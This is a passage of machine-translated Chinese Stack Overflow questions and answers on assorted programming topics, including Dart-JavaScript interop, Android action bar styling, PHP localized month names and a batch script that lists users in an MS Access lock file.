有什么想法可能导致它吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:49:17.617

目前尚不清楚你是*如何*编译的，但你至少想要相当于：

```
csc /target:winexe [rest of command line as before] 
```

基本上，命令行中的默认“项目类型”等同于“控制台应用程序”。

如果这没有帮助，请提供*更多*信息。

# ruby - 哪些 Ruby 库支持对 Relax NG 紧凑语法的验证？

> ID：13845521
> 
> 赞同：2
> 
> 时间：2012-12-12T17:42:15.160
> 
> 标签：ruby, xml, xml-parsing, schema, relaxng

哪些 Ruby 库支持使用 Relax NG 紧凑语法进行 XML 验证？

到目前为止，我已经尝试过 Nokogiri，但没有成功。它只支持`.rng`文件，不支持`.rnc`文件。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T18:34:18.850

我不知道。[使用Trang](http://www.thaiopensource.com/relaxng/trang.html)将您的 RELAX NG 紧凑模式转换为 XML 语法可能是最简单的。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2015-07-30T17:48:09.890

该站点看起来可能是您正在寻找的内容：

[https://github.com/sshaw/ruby-jing](https://github.com/sshaw/ruby-jing)

它似乎包装了 java 代码，但您可以使用 ruby​​ 并且另一个声称是更好的错误消息，这总是一件好事。没有什么比神秘的错误更糟糕的了。

# javascript - 从 Dart 调用 javascript

> ID：13845528
> 
> 赞同：21
> 
> 时间：2012-12-12T17:42:45.743
> 
> 标签：javascript, dart

我能够从 dart 发出警报消息，但不知道如何调用我在 dart 的另一个 js 文件中编写的函数。如果它是直截了当的，这将是一个很好的卖点。我确实看到了[这篇文章](https://stackoverflow.com/questions/7716004/will-dart-support-the-use-of-existing-javascript-libraries)，这让我开始了，但我觉得一定有办法，所以如果你想通了，请分享爱。

这是我所做的：

1.  将此添加到 yaml 文件中：

    依赖项：js：托管：js

2.  在 dart 文件顶部添加 import 语句： import 'package:js/js.dart' as js;

3.  添加这段代码以显示警报消息

    js.scoped(() { js.context.alert("欢呼雀跃！"); });

4.  这是我认为应该起作用但不起作用的部分：鉴于我有一个javascript函数doSomething（），我应该能够调用

    js.context.doSomething();

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2012-12-12T17:52:48.470

首先将[js 包](http://pub.dartlang.org/packages/js)作为依赖项添加到您的`pubspec.yaml`：

```
dependencies:
  js: any 
```

然后你可以像这样使用你自己的js函数`myFunc()`：

```
import 'package:js/js.dart' as js;

main() {
  js.context.myFunc();
} 
```

`js.context`是 javascript 的别名`window`。

有关更多详细信息，请参阅[使用 Dart 中的 JavaScript：js 库](http://www.dartlang.org/articles/js-dart-interop/)。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2019-05-20T20:35:24.953

也许我的回答对某人来说是值得的，所以这就是为什么我从 Dart 发布一个简单的 JS 函数调用。

1.  添加[`js`](https://pub.dev/packages/js)包依赖：

    ```
    dependencies:
      js: any 
    ```

2.  创建一个 JS 文件，假设`example.js`：

    ```
    function test() {
      return 12+20;
    } 
    ```

3.  将`example.js`上面的内容`index.html`与`<script src="...">`标签一起添加。
4.  将上面的函数从 JS 互操作到 Dart：

    ```
    @JS()
    library t;

    import 'package:js/js.dart';

    @JS()
    external int Test();

    class MyOwn {
      int get value => Test();
    } 
    ```

5.  而且，在 AngularDart 的 TODOLIST 中——这是可用的默认组件——：

    ```
    @override
    Future<Null> ngOnInit() async => print(MyOwn().value); 
    ```

# jsf-2 - JSF2 Primefaces 3.4 我可以在没有服务器端 API 的情况下对支持 bean 方法进行 ajax 调用，这意味着纯客户端代码提交

> ID：13845529
> 
> 赞同：1
> 
> 时间：2012-12-12T17:42:48.790
> 
> 标签：jsf-2, primefaces

我想在某些客户端事件上向服务器提交一些值，而我无法通过服务器端事件获得这些值。

(1) Primefaces.ab(formName,methodName,parameter)

想做类似上述代码的事情。实际上，我正在尝试在 primefaces 中保存每页事件的行数，但要遵循以下事件：

不返回每页当前的行，这就是为什么我在 Jquery 和每页模板的 Row 的 css 类的帮助下获得价值，我需要将该值提交给服务器端方法。

任何帮助表示赞赏。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-12T17:47:26.253

为此，[该`<p:remoteCommand>`组件](http://www.primefaces.org/showcase/ui/remoteCommand.jsf)是有意的。基本上，它允许您让 PrimeFaces 生成一个带有所需函数名称的 JS 函数引用，然后调用所需的支持 bean 操作方法。

例如：

```
<h:form>
    <p:remoteCommand name="functionName" action="#{bean.submit}" />
</h:form> 
```

然后将其调用为：

```
<script>
    functionName();
</script> 
```

您可以使用 JS 对象作为参数来传递请求参数：

```
<script>
    functionName({ paramName: "paramValue" });
</script> 
```

然后在 action 方法中可用：

```
String paramName = externalContext.getRequestParameterMap().get("paramName"); // Contains "paramValue". 
```

# jquery - JQuery 浏览器不会重新加载具有 usemap 的图像

> ID：13845530
> 
> 赞同：3
> 
> 时间：2012-12-12T17:42:50.680
> 
> 标签：jquery, imagemap

我正在使用图像映射（带有 ImageMapster 插件）让用户将鼠标悬停在图像的某些部分上，然后显示带有额外信息的更大版本。

然后我希望能够显示需要不同视角的图像的其他部分。我通过让用户转到下一张图像来做到这一点，该图像是人轻微旋转的图像，以创建一种“3D 效果”。我通过让用户单击箭头或使用键盘上的箭头键（没有图像映射）来做到这一点。我通过更改图像的 src 属性并添加时间戳来做到这一点，以便浏览器重新加载图像。

但是问题出现了：如果我更改具有图像映射的图像的 src，浏览器不会重新加载图像，也不会重新加载时间戳。我检查了页面的来源，并且 src 属性正确更改。

的HTML：

```
<img id="test" src="image1.jpg" usemap="#map1" />
<map name="map1">
 <area shape="poly" coords="...." href="#" />
</map> 
```

JS：

```
function showPicture(){
  var newImg = "image"+newindex+".jpg";
  $("#test").removeAttr("usemap");
  $("#test").attr("usemap", "#imgmap"+newindex);
  $("#test").removeAttr("src");
  $("#test").attr("src", newImg+"?" + new Date().getTime());
} 
```

如果我删除 usemap 属性，图像会重新加载，但如果我之后添加（不同的）图像映射则不会。我尝试在新图像加载完成后更改图像映射（因此在 load() 功能中），但这也不会使浏览器重新加载。

有人有什么想法吗？

提前致谢。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-03T08:05:41.270

发现了问题，我不得不解绑ImageMapster并重新绑定到图像

# grails-2.0 - 具有差异表名称的附加数据源

> ID：13845534
> 
> 赞同：0
> 
> 时间：2012-12-12T17:43:07.370
> 
> 标签：grails-2.0

我有一个名为 Test 的域，它一直在运行查找 SQL 查询以从另一个数据库中进行选择。

我想摆脱这种实现并转到 Grails 2.0 的多数据源支持。但是，另一个数据库中的表名是一个名为 Panel。

是否可以将域映射到备用数据库并映射它从哪个表中选择？

```
// Datasource.groovy
development {
    dataSource {
        dbCreate = 'create-drop' // one of 'create', 'create-drop','update'
        url = "jdbc:sqlserver://machine\\SQLEXPRESS;databaseName=primarydb"
        username = "user"
        password = "password"
    }
    dataSource_otherdb {
        url = "jdbc:sqlserver://remoteserver:1433;databaseName=otherdb"
    }
}

// Test.groovy
class Test {

    String name
    int key
    String abbreviation

    boolean active = true

    static mapping = {
        sort name: "asc"
        datasource("otherdb")
    }
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-13T06:13:24.567

映射闭包中有一个“表”配置。

```
// Test.groovy
class Test {

    String name
    int key
    String abbreviation

    boolean active = true

    static mapping = {
        table 'Panel'        //customize table name
        sort name: "asc"
        datasource("otherdb")
    }
} 
```

# jquery - 移动具有相同类的 div

> ID：13845541
> 
> 赞同：0
> 
> 时间：2012-12-12T17:43:24.173
> 
> 标签：jquery

这是我的 JSFIDDLE[**点击这里**](http://jsfiddle.net/cornelas/sB28J/)

我的问题是我有相同的类，我想在 div 类之上移动。因此，如果您查看我的 HTML，您会注意到我有 class = catalogItemFooter。我想在 class = catalogThumbnailArea 之前移动所述类。我的问题是，有多个类共享同一个类。如果您正在看我的小提琴，您会注意到它将两个项目移到另一个之上。我不想要这个，我希望名称高于其对应的目录ThumbnailArea，而不是将其添加到所有其他目录中。

到目前为止我的脚本

```
 $(".catalogItemFooter").parent().insertBefore("table.catalogThumbnailArea"); 
```

我意识到这可能很复杂，如果您需要更多信息，请询问。谢谢你。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:53:48.877

试试这个

```
$("div.catalogItemFooter").each(function() {
    var $this = $(this);
    var $thumb = $this.closest('table').prevAll('table.catalogThumbnailArea')
                                                                        .first();
    $this.insertBefore($thumb);
}); 
```

​</p>

我正在使用相应的类遍历所有 div 并将其插入到相应的表中。

**[检查小提琴](http://jsfiddle.net/sushanth009/sB28J/4/)**

# opengl - Opengl 加载矩阵

> ID：13845542
> 
> 赞同：2
> 
> 时间：2012-12-12T17:43:24.720
> 
> 标签：opengl, matrix

如果我想在 OpenGL 中构建翻译矩阵，我必须这样做：

```
float f[16] =
{
    1,0,0,1,
    0,1,0,2,
    0,0,1,3,
    0,0,0,1
};

glLoadMatrixf(f); 
```

或者

```
float f[16] =
{
    1,0,0,0,
    0,1,0,0,
    0,0,1,0,
    1,2,3,1
};

glLoadMatrixf(f); 
```

行列还是列行？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-12T18:38:37.907

第二个。OpenGL按以下顺序索引其矩阵

```
0 4 8 c
1 5 9 d
2 6 a e
3 7 b f 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-12T17:47:13.147

查看 [http://msdn.microsoft.com/en-us/library/windows/desktop/ee872049(v=vs.85).aspx](http://msdn.microsoft.com/en-us/library/windows/desktop/ee872049(v=vs.85).aspx) 向下滚动一点，它们会显示数组与矩阵的确切布局。

# android - 更改操作栏 onPressed 颜色

> ID：13845549
> 
> 赞同：15
> 
> 时间：2012-12-12T17:43:36.073
> 
> 标签：android, android-actionbar

我无法弄清楚如何在 Android 上更改操作栏项目“onPressed”的颜色。我不是在谈论操作栏背景颜色，而是关于蓝色过度状态。我怎样才能改变它的颜色或至少摆脱它？例如带有 homeAsUpIndicator 的 App 图标。

我尝试更改操作栏样式以及菜单项样式，但没有任何效果。

谢谢

*编辑* 这是我到目前为止的实现：

我的风格xml：

```
<style name="Theme.AppTheme" parent="@android:style/Theme.Holo">
    <item name="android:actionBarStyle">@style/MyActionBar</item>
    <item name="android:selectableItemBackground">@android:color/transparent</item>
    <item name="android:windowEnterAnimation">@anim/fadein</item>
    <item name="android:windowExitAnimation">@anim/fadeout</item>        
    <item name="android:actionBarItemBackground">@android:color/transparent</item>
</style>

<style name="MyActionBar" parent="@android:style/Widget.Holo.Light.ActionBar">
    <item name="android:background">@drawable/actionbarheader</item>
    <item name="android:backgroundStacked">@drawable/actionbarheader</item>
    <item name="android:backgroundSplit">@drawable/actionbarheader</item>
    <item name="android:titleTextStyle">@style/ActionBarTitle</item>
    <item name="android:actionBarItemBackground">@android:color/transparent</item>
    <item name="android:actionButtonStyle">@style/MyActionButtonStyle</item>
    <item name="android:homeAsUpIndicator">@drawable/actionbarlogo</item>
    <item name="android:icon">@drawable/app_icon</item>>
</style>

<style name="ActionBarTitle" parent="@android:style/TextAppearance.Holo.Widget.ActionBar.Title">
    <item name="android:textSize">20sp</item>
</style>

<style name="MyActionButtonStyle" parent="@android:style/Widget.Holo.Light.ActionButton">
    <item name="android:background">@android:color/transparent</item>
</style> 
```

然后我有一个用于actionbarogo的drawable：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
  <item android:drawable="@drawable/actionbarlogo_on" android:state_pressed="true"/>
  <item android:drawable="@drawable/actionbarlogo_on" android:state_focused="true"/>
  <item android:drawable="@drawable/actionbarlogo_off"/>
</selector> 
```

我的操作栏项目的菜单 xml：

```
<menu xmlns:android="http://schemas.android.com/apk/res/android">
    <item android:id="@+id/ContactsMode"
        android:icon="@drawable/actionbarcontacts"
        android:title="@string/contacts"
        android:orderInCategory="100"
        android:showAsAction="always"
        android:background="@android:color/transparent" />
</menu> 
```

最后，该项目的可绘制：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
  <item android:drawable="@drawable/actionbarcontacts_on" android:state_pressed="true"/>
  <item android:drawable="@drawable/actionbarcontacts_on" android:state_focused="true"/>
  <item android:drawable="@drawable/actionbarcontacts_off"/>
</selector> 
```

以下是我为 ActionBar 创建菜单项的方法：

```
public boolean onCreateOptionsMenu(Menu menu) {
        MenuInflater inflater = getMenuInflater();
        inflater.inflate(R.menu.main_menu, menu);
        actionBar.setIcon(R.drawable.actionbarlogo);
        return true;
    }

    public boolean onPrepareOptionsMenu(Menu menu) {        
         MenuItem item= menu.findItem(R.id.ContactsMode);
         if(ContactsButton)
             item.setVisible(true);      
         else
            item.setVisible(false);

         return true;   
    } 
```

* * *

## 回答 #1

> 赞同：38
> 
> 时间：2012-12-12T20:20:22.067

要将应用程序图标的背景与 homeAsUpIndicator 一起设置（这两个图标有一个共同的背景），您必须`android:actionBarItemBackground`在主题中设置项目。主题必须包含类似这样的内容（我假设您使用[ActionBarSherlock](http://actionbarsherlock.com/)）：

```
<style name="MyTheme" parent="@style/Theme.Sherlock">
    <!-- for ActionBarSherlock -->
    <item name="actionBarItemBackground">@drawable/my_background</item>
    <!-- for native ActionBar -->
    <item name="android:actionBarItemBackground">@drawable/my_background</item>
</style> 
```

drawable`drawable/my_background.xml`将是[StaleListDrawable](http://developer.android.com/guide/topics/resources/drawable-resource.html#StateList)，其中包含以下内容：

```
<?xml version="1.0" encoding="utf-8"?>
<selector xmlns:android="http://schemas.android.com/apk/res/android">
    <item
        android:state_pressed="true"
        android:drawable="@drawable/my_background_pressed" />
    <item
        android:drawable="@drawable/my_background_normal" />
</selector> 
```

要完全禁用背景，您可以设置透明背景，或者`@null`主题中的值也可能起作用。

主题项`android:actionBarItemBackground`设置应用程序图标和 homeAsUpIndicator 的背景。但它也设置**了菜单项的默认背景、溢出图标和标题的背景**。这些背景可以被覆盖。

**菜单项**

要更改菜单项背景`(android:)actionButtonStyle`，请在主题中设置一个适当的选项，如下所示：

```
<style name="MyTheme" parent="@style/Theme.Sherlock">
    <item name="actionButtonStyle">@style/MyActionButtonStyle</item>
    <item name="android:actionButtonStyle">@style/MyActionButtonStyle</item>
</style> 
```

并将`MyActionButtonStyle`包含如下内容：

```
<style name="MyActionButtonStyle" parent="@style/Widget.Sherlock.ActionButton">
    <item name="android:background">@drawable/my_background</item>
</style> 
```

**溢出图标**

最后，要更改溢出图标背景`android:actionOverflowButtonStyle`，请在主题中设置一个适当的选项，如下所示：

```
<style name="MyTheme" parent="@style/Theme.Sherlock">
    <item name="actionOverflowButtonStyle">@style/MyOverflowButtonStyle</item>
    <item name="android:actionOverflowButtonStyle">@style/MyOverflowButtonStyle</item>
</style> 
```

并将`MyOverflowButtonStyle`包含如下内容：

```
<style name="MyOverflowButtonStyle" parent="@style/Widget.Sherlock.ActionButton.Overflow">
    <item name="android:background">@drawable/my_background</item>
</style> 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-20T09:44:20.893

修复。有一个父活动在 onCreate 方法中更改主题...

我不知道您可以通过以下方式在活动中以编程方式设置主题：

```
setTheme(R.style.MyTheme); 
```

# php - PHP date - 以本地语言获取月份的名称

> ID：13845554
> 
> 赞同：28
> 
> 时间：2012-12-12T17:44:00.710
> 
> 标签：php, date, localization

我有这部分功能，它给了我英文月份的名称。如何将它们翻译成我的当地语言（塞尔维亚语）？

```
$month_name = date('F', mktime(0, 0, 0, $i)); 
```

其中`$i`是月份数（值 1 - 12）。另请参阅[PHP:mktime](https://www.php.net/manual/en/function.mktime.php)。

* * *

## 回答 #1

> 赞同：28
> 
> 时间：2012-12-12T17:46:56.557

你应该使用[`setlocale()`](http://php.net/setlocale)：

```
setlocale(LC_TIME, 'fr_FR');
$month_name = date('F', mktime(0, 0, 0, $i)); 
```

在这种情况下，它将设置为法语。对于您的情况，它应该是以下之一：

1.  `sr_BA`- 塞尔维亚语（黑山）
2.  `sr_CS`- 塞尔维亚语（塞尔维亚）
3.  `sr_ME`- 塞尔维亚语（塞尔维亚和黑山）

* * *

## 回答 #2

> 赞同：22
> 
> 时间：2016-01-11T08:00:13.557

你应该使用[`setlocale()`](http://php.net/setlocale)and [`strftime()`](http://php.net/strftime)：

```
setlocale(LC_TIME, 'sr_CS');
$month_name = strftime('%B', mktime(0, 0, 0, $i)); 
```

* * *

## 回答 #3

> 赞同：9
> 
> 时间：2017-06-14T09:04:05.543

这是[IntlDateFormatter的示例](http://php.net/manual/en/class.intldateformatter.php)

```
$format = new IntlDateFormatter('sr_CS', IntlDateFormatter::NONE, 
              IntlDateFormatter::NONE, NULL, NULL, "MMM");
$monthName = datefmt_format($format, mktime(0, 0, 0, $i)); 
```

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2020-02-14T12:20:38.180

对于所有与德语（和`de_DE`）斗争的人，请确保您使用的是正确的语言代码。登录到您的服务器并运行[`locale -a`](https://stackoverflow.com/q/10909911/1066234)以查看所有可用服务器的列表。对我来说，它显示：

> C
> C.UTF-8
> de_AT.utf8
> de_BE.utf8
> de_CH.utf8
> de_DE.utf8
> de_LI.utf8
> de_LU.utf8
> ...

您需要使用其中一种代码。

然后你可以使用：

```
date_default_timezone_set('Europe/Berlin');
setlocale(LC_ALL, 'de_DE.utf8');
$date_now = date('Y-m-d');
$month_available = strftime('%B %Y', strtotime($date_now));
$month_next = strftime('%B %Y', strtotime($date_now.' +1 month')); 
```

和“März 2020”等正确显示。

* * *

## 回答 #5

> 赞同：3
> 
> 时间：2021-02-25T23:54:10.743

这个问题询问如何获取月份列表，我只看到提示，而不是完整的代码答案，所以：

如果您有`IntlDateFormatter`可用的 - 在大多数情况下都可用，您可以在给定的语言环境中创建一个格式化程序，并重复地将一个日期推送到它仅基于月份数创建的日期

```
// or any other locales like pl_PL, cs_CZ, fr_FR, zh, zh_Hans, ...
$locale = 'en_GB';
$dateFormatter = new IntlDateFormatter(
    $locale,
    IntlDateFormatter::LONG, // date type
    IntlDateFormatter::NONE  // time type
);
$dateFormatter->setPattern('LLLL'); // full month name with NO DECLENSION ;-)
$months_locale = [];
for ($month_number = 1; $month_number <= 12; ++$month_number) {
    $months_locale[] = $dateFormatter->format(
        // 'n' => month number with no leading zeros
        DateTime::createFromFormat('n', (string)$month_number)
    );
}
// test output
echo "<pre>";
var_dump($months_locale);
echo "</pre>"; 
```

**注意：** `LLLL`注意不下降，但如果语言有这样的东西，它**不注意第一个字母的小写/大写。**
很好的例子是你可以得到`January`for `en_GB`but `leden`for`cs_CZ`
如果你想要所有字母小写 => 使用[`mb_strtolower($month_name);`- docs](https://www.php.net/manual/en/function.mb-strtolower.php)
如果你只想第一个字母是大写 =>
=> 使用[`mb_convert_case($month_name, MB_CASE_TITLE, 'UTF-8');`- docs](https://www.php.net/manual/en/function.mb-convert-case.php)

**始终将`mb_*`函数或其变体用于源自语言环境的字符串！**

所以不，不要使用~~`ucfirst`~~！

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2018-01-03T13:12:39.113

在设置语言环境时传递编码是个好主意：

```
 <?php    
 date_default_timezone_set('Europe/Belgrade');
 setlocale(LC_TIME, array('sr_CS.UTF-8', 'sr.UTF-8')); 
```

# parsing - 需要帮助编写批处理文件以读取带有空分隔符的 MS Access .ldb 锁定文件

> ID：13845555
> 
> 赞同：5
> 
> 时间：2012-12-12T17:44:00.630
> 
> 标签：parsing, batch-file, ms-access, command

我正在尝试创建一个批处理文件来读取 Microsoft Access .ldb 锁定文件。锁定文件包含计算机名和用户名的列表。我想提取计算机名称并最终针对外部命令运行它们。

批处理文件的格式是单行，其中 (1) 计算机名称 (2) NULL 字符 (Hex 00) (3) 大约 20 个空格 (4) 用户名​​ (5) NULL 字符 (6) 大约 20空格重复。

Notepad++ 中`(NUL)`表示 Hex 00 的示例：

```
COMPUTER0123(NUL) 管理员(NUL) COMPUTER0507(NUL) 管理员(NUL)

```

我尝试了几种方法`FOR`来读取文件，但无法通过第一个计算机名称。

```
setlocal EnableDelayedExpansion
设置文件=database.ldb

for /F %%a in ('type %file%') do (
    回声 %%a
    )

```

对于我的大多数 Access 数据库，文件中的用户名是`Admin`. 我已经能够`FIND`告诉我文件中出现了多少“管理员”（加 1）。

```
for /f "delims=" %%n in ('find /c /v "Admin" %file%') do set "len=%%n"
set "len=!len:*:=!"
echo %len% (minus 1) computer names to process 
<%file% (
  for /l %%l in (1 1 !len!) do (  
    set "line="
    set /p "line="
    echo(!line!)    
    )
) 
```

遍历找到的行不起作用，可能是因为文件中只有一行（没有回车）。

我想找到一个适用于 Windows XP 标准安装的解决方案。

* * *

收到接受的答案后，我将其合并到我在下面发布的批处理文件中。我命名了该文件`ShowUsersInLDB.bat`并将其放在我的*SendTo*文件夹中。

```
@echo off
::===================================================================
:: Put this in your SendTo folder and it will let you right-click 
:: on an Access .ldb/.laccdb lock file and tell you the computer
:: names that have opened the database.  
::
:: After the computer names are shown, this will prompt you to 
:: search for the user names associated with each computer.  This
:: depends upon finding a 3rd party file named NetUsers.exe in
:: the user profile folder.  Feel free to change the path if you
:: want to store the file in another location.
:: 
:: NetUsers.exe can be downloaded from here:  http://www.optimumx.com/downloads.html#NetUsers
::
:: Notes:
:: 1) Keep in mind that sometimes after people leave the database 
:: the lock file still shows their computer name.  Don't jump
:: to conclusions.
:: 2) NetUsers.exe seems to report all users who have logged on
:: to the computer and not logged off, including services.  
:: If you aren't familiar with your user names or your users are
:: sharing remote desktops/Citrix/Terminal Services, you may have 
:: to guess who might have created the lock entry. 
::
:: Installation:
:: You may find a batch file named Install_UsersInLDB.bat that will 
:: copy this file to the SendTo folder and the NetUsers.exe file to 
:: the user profile (or a place you define).
::
:: Ben Sacherich - March 2014
:: Please let me know if you have any ideas for improvements.
::===================================================================

setlocal
set file="%1"

:: Make sure the file has a compatible extension.
if  "%~x1"==".ldb"    goto :ExtensionIsValid
if  "%~x1"==".laccdb" goto :ExtensionIsValid

echo.
echo "%~n1%~x1" is not the correct file type.
echo.
pause
goto :End

:ExtensionIsValid
echo The Access "%~n1%~x1" file contains
echo the following computer names:
echo.
set "compNameLine=1"
for /f %%A in ('more "%file%"') do (
  if defined compNameLine (
    echo %%A
    set "compNameLine="
  ) else set "compNameLine=1"
)

echo.
echo Are you ready to look up the user names on each computer?
pause

set "compNameLine=1"
for /f %%A in ('more "%file%"') do (
  if defined compNameLine (
    ::echo %%A
    "%userprofile%\netusers" \\%%A
    set "compNameLine="
  ) else set "compNameLine=1"
)

echo.
echo -- Validation finished at %time%  
pause
:End
exit 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-12T18:38:57.103

CMD.EXE 通常不能很好地处理 NUL 字节。但是有一些外部命令可以处理 NUL 字节。

您还必须担心“线”的长度。CMD.EXE 不喜欢长度超过 8191 字节的行。

我认为您最好的选择是更多，因为它将 NUL 转换为新行。

以下应回显您的计算机名称。

```
@echo off
setlocal
set "file=database.ldb"
set "compNameLine=1"
for /f %%A in ('more "%file%"') do (
  if defined compNameLine (
    echo %%A
    set "compNameLine="
  ) else set "compNameLine=1"
) 
```

# air - AIR sqlite异步数据库连接？

> ID：13845564
> 
> 赞同：0
> 
> 时间：2012-12-12T17:44:31.257
> 
> 标签：air

```
function openDatabase():void
{
    var dbFile:File = File.applicationStorageDirectory.resolvePath("database.db");
    connection = new SQLConnection();
    connection.addEventListener(SQLEvent.OPEN, onOpen);
    connection.openAsync(dbFile, "create");
} 
```

我在 AIR 中使用此代码创建连接并且它正在工作但数据库文件在哪里？applicationStorageDirectory 在哪里？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T19:03:07.000

它取决于平台（Mac、Windows 等）。如果您打印出“File.applicationStorageDirectory.nativePath”的值，它将为您提供当前平台文件系统上的完全指定路径。

# javascript - 来自jquery mobile的页面加载功能

> ID：13845569
> 
> 赞同：0
> 
> 时间：2012-12-12T17:45:01.897
> 
> 标签：javascript, jquery, jquery-mobile

每次加载具有类“someClass”的页面时，我都想触发一些操作。我发现jquery mobile中有pageload功能，但我不知道如何使用它。我希望它做这样的事情：

```
$('.someClass').pageload(function(){
   alert('Hello World');
}); 
```

正确使用它吗？或者有没有其他方法可以做到这一点。谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-12T17:48:46.570

您应该使用监听 pageshow 事件的委托，如下所示：

```
$(document).delegate('.someClass', 'pageshow', function() {
//Do something
}); 
```

# ios - 为什么我的可变数组在 prepareForSegue 方法中变为 NULL？

> ID：13845570
> 
> 赞同：-4
> 
> 时间：2012-12-12T17:45:05.597
> 
> 标签：ios, objective-c, arrays, null, uistoryboardsegue

我想使用情节提要将数组传递给另一个类，并且我准备了以下代码，但是，日志显示可变数组为空，显然不是这种情况（在另一种方法中，日志显示它不为空，仅在调用 prepareForSegue 时才变为空）。为什么是这样？

```
- (void)prepareForSegue:(UIStoryboardSegue *)segue sender:(id)sender {
    if ([segue.identifier isEqualToString:@"confirmSegue"]) {
        SBBookingConfirmation *bookingConfirmed=(SBBookingConfirmation*)segue.destinationViewController;
        NSLog(@"dates chosen - %@", self.dateChosen);    
        bookingConfirmed.confirmedTimings=self.dateChosen;
    }
} 
```

输出：

```
dates chosen - (null) 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-12T17:52:33.303

显然，你正在改变`self.dateChosen`其他地方。这与`prepareForSegue:`.

在调用 segue 之前返回并检查你做了什么（通过 IB 或通过方法）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-12T18:29:10.903

确保您的 dateChosen 属性是强类型：

```
@property (nonatomic, strong) NSMutableArray *dateChosen;
//if you have an NSArray instead of NSMutableArray, use copy instead of strong 
```

同样在您的“方法”方法中（有史以来最糟糕的名字！），您应该使用 setter 来设置 dateChosen：

```
-(void)method:(NSMutableArray *)array {
 self.dateChosen=array; //not dateChosen = array;
 NSLog(@"The following has been copied %@", self.dateChosen);
} 
```

最后，您需要在某处初始化您的数组。如果你从来没有做过类似的事情

```
self.dateChosen = [NSMutableArray array]; 
```

或者

```
self.dateChosen = <NON-NIL array pointer> 
```

难怪它会为零。

附带说明：更好地选择您的方法/变量名称。不要将方法称为“方法”。如果使用数组，通常最好以复数形式命名它：date* *s* *Chosen，而不是 dateChosen。

# javascript - Knockout.Mapping 和 EcmaScript 5 得到设置

> ID：13845573
> 
> 赞同：2
> 
> 时间：2012-12-12T17:45:12.133
> 
> 标签：javascript, knockout.js, knockout-mapping-plugin, ecmascript-5

ko.mapping 可以在单个 ko.computed中转换[get、set 属性 (ES5)吗？](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Working_with_Objects#Defining_Getters_and_Setters)

```
var people = { 
    get Name (){ 
        return this._name;
    },
    set Name(value){
        this._name = value;
    } 
};
var vm = ko.mapping(people, {/* mapping getset to computed */});
vm.Name instanceOf ko.computed === true. 
```

ko.mapping 支持这个或如何做到这一点？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-13T06:18:25.067

我确定您的意思是使用可观察对象，而不是计算对象，因为这不依赖于其他可观察对象。

我创建[了一个要点，包括测试，](https://gist.github.com/4274461)创建具有可观察属性的模型，以及创建它们的一些实用函数。核心代码在这里：

```
var defineProperty = function(type, obj, prop, def) {
  if (obj == null || typeof obj != 'object' || typeof prop != 'string') {
    throw new Error('invalid arguments passed');
  }

  if (Object.prototype.toString.call(def) === '[object Array]' && type === 'observable') {
    type = 'observableArray';
  }

  var obv = ko[type](def);
  Object.defineProperty(obj, prop, {
    set: function(value) { obv(value) },
    get: function() { return obv() },
    enumerable: true,
    configurable: true
  });

  Object.defineProperty(obj, '_' + prop, {
    get: function() { return obv },
    enumerable: false
  });
};

ko.utils.defineObservableProperty = defineProperty.bind(null, 'observable');
ko.utils.defineComputedProperty = defineProperty.bind(null, 'computed');

ko.observableModel = function(defaults) {
  for (var prop in defaults) {
    if (defaults.hasOwnProperty(prop)) {
      if (defaults[prop] != null && typeof defaults[prop] == 'object' && Object.prototype.toString.call(defaults[prop]) !== '[object Array]') {
        // should this also be an observable property?
        this[prop] = new ko.observableModel(defaults[prop]);
      } else if (!defaults[prop] || !ko.isSubscribable(defaults[prop])) {
        ko.utils.defineObservableProperty(this, prop, defaults[prop]);
      } else {
        this[prop] = defaults[prop];
      }
    }
  }
}; 
```

# android - 执行搜索查询时光标始终返回为空

> ID：13845575
> 
> 赞同：0
> 
> 时间：2012-12-12T17:45:25.627
> 
> 标签：android, search, cursor

我正在尝试使用光标编写搜索查询。它总是将光标返回为空。此查询应该返回我正在搜索的文本的项目列表（String[] selectionArgs = { inputText };）。其中 inputText 是我正在搜索的搜索词。

```
 Uri uri = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
        String[] projection    = new String[] {ContactsContract.Contacts._ID, ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER};
        String selection = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " = ? ";
        String[] selectionArgs = { inputText };

        // Expecting problem in the query.
        Cursor people = getContentResolver().query(uri, projection, selection, selectionArgs, null);

        int indexName = people.getColumnIndex(StructuredName.DISPLAY_NAME);
        int indexNumber = people.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER);
        int idIdx = people.getColumnIndexOrThrow(PhoneLookup._ID);

        if(!people.moveToFirst())
        {
            Log.w("No Cursor.., ","No cursor.., Cursor is empty..");
        }

        do {
            String id = people.getString(idIdx);
            String name   = people.getString(indexName);
            String number = people.getString(indexNumber);
            // Do work...
        } while (people.moveToNext());

        return people; 
```

它返回以下错误。

```
W/No Cursor.., ( 1303): No cursor.., Cursor is empty..

W/Filter  ( 1303): An exception occured during performFiltering()!
